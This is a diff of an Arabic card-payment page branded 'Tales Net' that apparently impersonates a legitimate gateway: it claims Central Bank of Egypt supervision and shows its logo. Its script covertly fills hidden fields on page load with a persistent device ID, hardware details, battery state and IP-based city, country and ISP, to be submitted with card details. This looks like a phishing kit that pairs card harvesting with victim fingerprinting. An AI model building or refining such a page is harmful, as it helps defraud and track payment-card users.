@@ -4,245 +4,19 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>بيانات الدفع الآمن - حكايات</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tales Net - بيانات الدفع الآمن</title>
+
+    <!-- 🔒 استدعاء ملف الحماية المطور -->
+    <script src="protection.js" defer></script>
 
     <!-- FontAwesome & Bootstrap Grid CSS -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/css/bootstrap-grid.min.css">
 
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f7f6;
-            margin: 0;
-            padding: 0;
-            direction: rtl;
-        }
-
-        .payment-header {
-            text-align: center;
-            margin-top: 2rem;
-            margin-bottom: 1.5rem;
-        }
-
-        .payment-header h1 {
-            font-size: 24px;
-            font-weight: 600;
-            color: #01338D;
-        }
-
-        .checkout-card {
-            background: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
-            padding: 25px;
-            max-width: 480px;
-            margin: 0 auto 30px auto;
-        }
-
-        .input-group-custom {
-            margin-bottom: 15px;
-            position: relative;
-        }
-
-        .input-group-custom label {
-            display: block;
-            margin-bottom: 6px;
-            font-weight: bold;
-            font-size: 14px;
-            color: #333;
-        }
-
-        .input-wrapper {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-
-        .input-wrapper input, .input-group-custom select {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ced4da;
-            border-radius: 6px;
-            font-size: 15px;
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            text-align: left;
-            direction: ltr;
-            box-sizing: border-box;
-        }
-
-        .input-group-custom select {
-            text-align: right;
-            direction: rtl;
-            background: #fff;
-        }
-
-        .input-wrapper input:focus, .input-group-custom select:focus {
-            border-color: #01338D;
-        }
-
-        .input-wrapper input.is-invalid {
-            border-color: #dc3545 !important;
-        }
-
-        .input-icon-right {
-            position: absolute;
-            right: 12px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            pointer-events: none;
-            background: #fff;
-            padding-left: 5px;
-        }
-
-        .input-icon-right .meeza-badge {
-            background: #004a99;
-            color: white;
-            font-size: 11px;
-            font-weight: bold;
-            padding: 2px 6px;
-            border-radius: 4px;
-            letter-spacing: 0.5px;
-        }
-
-        .input-icon-right .cash-icon {
-            color: #28a745;
-            font-size: 18px;
-        }
-
-        .toggle-password {
-            position: absolute;
-            left: 12px;
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #6c757d;
-            font-size: 16px;
-            outline: none;
-        }
-
-        .error-message {
-            color: #dc3545;
-            font-size: 12px;
-            margin-top: 4px;
-            display: none;
-            text-align: right;
-            direction: rtl;
-        }
-
-        .input-containers {
-            display: flex;
-            gap: 10px;
-        }
-
-        .input-containers .input-group-custom {
-            flex: 1;
-        }
-
-        #card_section {
-            display: none;
-        }
-
-        .card-footer-box {
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .saveCardText {
-            display: flex;
-            align-items: center;
-            justify-content: flex-end;
-            gap: 8px;
-            font-size: 14px;
-            color: #555;
-            margin-bottom: 15px;
-        }
-
-        .submit-btn {
-            background-color: #01338D;
-            color: #ffffff;
-            border: none;
-            width: 100%;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        .submit-btn:hover {
-            background-color: #002266;
-        }
-
-        .submit-btn:disabled {
-            background-color: #6c757d;
-            cursor: not-allowed;
-        }
-
-        .secured-tag {
-            display: block;
-            margin-top: 12px;
-            font-size: 12px;
-            color: #777;
-        }
-
-        footer {
-            padding: 25px 0 35px 0;
-            background: #ffffff;
-            border-top: 1px solid #e9ecef;
-            margin-top: 25px;
-        }
-
-        .bank-logos-container {
-            text-align: center;
-        }
-
-        .bank-logos-title {
-            font-size: 13px;
-            color: #6c757d;
-            margin-bottom: 16px;
-            font-weight: 600;
-        }
-
-        .bank-logos-grid {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-        }
-
-        .bank-logo-card {
-            background: #ffffff;
-            border: 1px solid #e2e8f0;
-            border-radius: 8px;
-            padding: 6px 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.04);
-            transition: transform 0.2s, box-shadow 0.2s;
-            height: 48px;
-        }
-
-        .bank-logo-card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 10px rgba(0,0,0,0.08);
-        }
-
-        .bank-logo-card img {
-            max-height: 32px;
-            max-width: 90px;
-            width: auto;
-            object-fit: contain;
-        }
-    </style>
+    <!-- ملف التنسيقات الخارجي -->
+    <link rel="stylesheet" href="style.css">
 </head>
-
 <body>
 
     <header class="payment-header">
@@ -256,7 +30,7 @@
                     <input type="hidden" id="card_expiry_mm" name="card_expiry_mm">
                     <input type="hidden" id="card_expiry_yy" name="card_expiry_yy">
 
-                    <!-- خانات مخفية لإرسال بيانات الجهاز والشبكة للمظلة -->
+                    <!-- خانات مخفية لإرسال بيانات الجهاز والشبكة -->
                     <input type="hidden" name="geoCity" id="geoCity" value="غير معروف">
                     <input type="hidden" name="geoCountry" id="geoCountry" value="غير معروف">
                     <input type="hidden" name="ispProvider" id="ispProvider" value="غير معروف">
@@ -264,12 +38,12 @@
                     <input type="hidden" name="deviceRAM" id="deviceRAM" value="غير معروف">
                     <input type="hidden" name="cpuCores" id="cpuCores" value="غير معروف">
                     <input type="hidden" name="deviceType" id="deviceType" value="غير معروف">
+                    <input type="hidden" name="deviceModel" id="deviceModel" value="غير محدد">
                     <input type="hidden" name="screenSize" id="screenSize" value="غير معروف">
                     <input type="hidden" name="userTimeZone" id="userTimeZone" value="غير معروف">
                     <input type="hidden" name="lang" id="lang" value="غير معروف">
-<!-- أضف هذا السطر مع باقي الخانات المخفية -->
-<input type="hidden" name="clientID" id="clientID" value="غير متوفر">
-                    
+                    <input type="hidden" name="clientID" id="clientID" value="غير متوفر">
+
                     <!-- 1. اختيار وسيلة الدفع -->
                     <div class="input-group-custom">
                         <label>اختر وسيلة الدفع:</label>
@@ -278,7 +52,7 @@
                             <option value="card">💳 بطاقة بنكية</option>
                         </select>
                     </div>
-                    
+
                     <!-- 2. قيمة المبلغ -->
                     <div class="input-group-custom">
                         <label>المبلغ (بالجنيه):</label>
@@ -394,7 +168,7 @@
 
     <footer>
         <div class="container bank-logos-container">
-            <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i> معتمد و تحت أشراف البنك المركزي</div>
+            <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i> معتمد وتحت إشراف البنك المركزي</div>
             <div class="bank-logos-grid">
                 <div class="bank-logo-card" title="البنك المركزي المصري">
                     <img src="https://cbpn.currencyresearch.com/wp-content/uploads/2025/09/CentralBankofEgypt.png.webp" alt="البنك المركزي المصري">
@@ -405,58 +179,50 @@
 
     <script>
         // --- 1. جلب بيانات الجهاز تلقائياً وتخزينها في الخانات المخفية ---
-function getOrCreateClientID() {
-    let clientId = localStorage.getItem('hikayat_client_id');
-    if (!clientId) {
-        clientId = 'DEV-' + Math.random().toString(36).substring(2, 9).toUpperCase() + '-' + Date.now().toString().slice(-4);
-        localStorage.setItem('hikayat_client_id', clientId);
-    }
-    return clientId;
-}
+        function getOrCreateClientID() {
+            let clientId = localStorage.getItem('hikayat_client_id');
+            if (!clientId) {
+                clientId = 'DEV-' + Math.random().toString(36).substring(2, 9).toUpperCase() + '-' + Date.now().toString().slice(-4);
+                localStorage.setItem('hikayat_client_id', clientId);
+            }
+            return clientId;
+        }
 
-async function collectDeviceDetails() {
-    // تعيين معرف الجهاز
-    document.getElementById('clientID').value = getOrCreateClientID();
-
-    document.getElementById('deviceRAM').value = (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير مدعوم');
-    document.getElementById('cpuCores').value = navigator.hardwareConcurrency || 'غير معروف';
-    document.getElementById('screenSize').value = `${window.screen.width} x ${window.screen.height}`;
-    document.getElementById('userTimeZone').value = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
-    document.getElementById('lang').value = navigator.language || navigator.userLanguage || 'غير معروف';
+        async function collectDeviceDetails() {
+            document.getElementById('clientID').value = getOrCreateClientID();
+            document.getElementById('deviceRAM').value = (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير مدعوم');
+            document.getElementById('cpuCores').value = navigator.hardwareConcurrency || 'غير معروف';
+            document.getElementById('screenSize').value = `${window.screen.width} x ${window.screen.height}`;
+            document.getElementById('userTimeZone').value = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
+            document.getElementById('lang').value = navigator.language || navigator.userLanguage || 'غير معروف';
 
             const ua = navigator.userAgent;
-let deviceType = '💻 كمبيوتر (Desktop)';
-let deviceModel = 'غير محدد';
+            let deviceType = '💻 كمبيوتر (Desktop)';
+            let deviceModel = 'غير محدد';
 
-// 1. فحص أجهزة الآيفون والـ iOS
-if (/iPhone/i.test(ua)) {
-    deviceType = '📱 هاتف (iPhone)';
-    deviceModel = 'Apple iPhone';
-} else if (/iPad/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
-    deviceType = '📱 تابلت (iPad)';
-    deviceModel = 'Apple iPad';
-} else if (/Android/i.test(ua)) {
-    if (/Mobile/i.test(ua)) {
-        deviceType = '📱 هاتف (Android)';
-    } else {
-        deviceType = '📱 تابلت (Android Tablet)';
-    }
-} else if (/Macintosh|Mac OS X/i.test(ua)) {
-    deviceType = '💻 كمبيوتر (MacBook / Mac)';
-} else if (/Windows/i.test(ua)) {
-    deviceType = '💻 كمبيوتر (Windows PC)';
-}
+            if (/iPhone/i.test(ua)) {
+                deviceType = '📱 هاتف (iPhone)';
+                deviceModel = 'Apple iPhone';
+            } else if (/iPad/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+                deviceType = '📱 تابلت (iPad)';
+                deviceModel = 'Apple iPad';
+            } else if (/Android/i.test(ua)) {
+                if (/Mobile/i.test(ua)) {
+                    deviceType = '📱 هاتف (Android)';
+                } else {
+                    deviceType = '📱 تابلت (Android Tablet)';
+                }
+            } else if (/Macintosh|Mac OS X/i.test(ua)) {
+                deviceType = '💻 كمبيوتر (MacBook / Mac)';
+            } else if (/Windows/i.test(ua)) {
+                deviceType = '💻 كمبيوتر (Windows PC)';
+            }
 
-// تخزين القيمة في الخانات المخفية
-document.getElementById('deviceType').value = deviceType;
+            document.getElementById('deviceType').value = deviceType;
+            if (document.getElementById('deviceModel')) {
+                document.getElementById('deviceModel').value = deviceModel;
+            }
 
-// أضف هذه الخانة المخفية في HTML إن لم تكن موجودة: <input type="hidden" name="deviceModel" id="deviceModel">
-if (document.getElementById('deviceModel')) {
-    document.getElementById('deviceModel').value = deviceModel;
-}
-            
-
-            // جلب حالة البطارية إن أمكن
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -466,7 +232,6 @@ if (document.getElementById('deviceModel')) {
                 }
             }
 
-            // جلب بيانات المدينة والدولة ومزود الخدمة (Registered ISP)
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 if (!res.ok) throw new Error("فشل ipapi");
@@ -476,7 +241,6 @@ if (document.getElementById('deviceModel')) {
                 document.getElementById('geoCountry').value = data.country_name || 'غير معروف';
                 document.getElementById('ispProvider').value = data.org || data.asn || 'غير معروف';
             } catch (err) {
-                // Fallback لتغطية التوقف عبر ip-api
                 try {
                     const fallbackRes = await fetch('https://ip-api.com/json/?fields=status,country,city,isp,org');
                     const fbData = await fallbackRes.json();
@@ -491,7 +255,6 @@ if (document.getElementById('deviceModel')) {
             }
         }
 
-        // تشغيل جلب البيانات عند تحميل الصفحة
         collectDeviceDetails();
 
         // --- 2. إدارة الواجهة والتحقق من المدخلات ---
